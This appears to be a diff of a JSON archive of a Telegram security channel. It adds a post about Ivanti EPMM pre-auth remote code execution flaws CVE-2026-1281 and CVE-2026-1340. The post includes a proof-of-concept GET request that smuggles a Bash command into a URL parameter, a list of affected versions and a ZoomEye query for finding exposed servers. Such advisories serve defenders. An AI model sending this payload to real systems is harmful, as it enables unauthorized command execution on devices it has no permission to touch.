@@ -1,8 +1,15 @@
 {
   "channel": "P0x3k_1N73LL1G3NC3",
-  "last_update": "2026-01-30T18:54:30.655543+00:00",
-  "messages_count": 84,
+  "last_update": "2026-01-31T05:04:55.942268+00:00",
+  "messages_count": 85,
   "messages": [
+    {
+      "id": "254",
+      "title": "Someone Knows Bash Far Too Well, And We Love It (Ivanti EPMM Pre-Auth RCEs CVE-2026-1281 & CVE-2026-1340)",
+      "text": "Someone Knows Bash Far Too Well, And We Love It (Ivanti EPMM Pre-Auth RCEs CVE-2026-1281 & CVE-2026-1340)\nCode injection issues, allowing a remote unauthenticated attacker to execute arbitrary code on an affected device. The attackers can provide Bash commands as part of a malicious HTTP GET request to the endpoints that service either the “In-House Application Distribution” feature (i.e. /mifs/c/appstore/fob/) or the “Android File Transfer Configuration” feature (i.e. /mifs/c/aftstore/fob/), resulting in arbitrary OS command execution on the target.\nPoC Request:\nGET /mifs/c/appstore/fob/3/5/sha256:kid=1,st=theValue%20%20,\net=1337133713,h=gPath%5B%60id%20>%20/mi/poc%60%5D/\n13371337-1337-1337-1337-133713371337.ipa HTTP/1.1\nHost: f5-research-lab-ioc-block-it-all.f5\nAffected versions:\n• 12.7.0.0 and prior\n• 12.6.0.0 and prior\n• 12.5.0.0 and prior\n• 12.6.1.0 and prior\n• 12.5.1.0 and prior\nQuery:\nZoomEye: app=\"Ivanti Endpoint Manager Mobile\"\n\n[Media: Фото]",
+      "link": "https://t.me/P0x3k_1N73LL1G3NC3/254",
+      "pub_date": "2026-01-30T18:59:02+00:00"
+    },
     {
       "id": "253",
       "title": "Новый сканер для обнаружения уязвимостей к NTLM релеям",
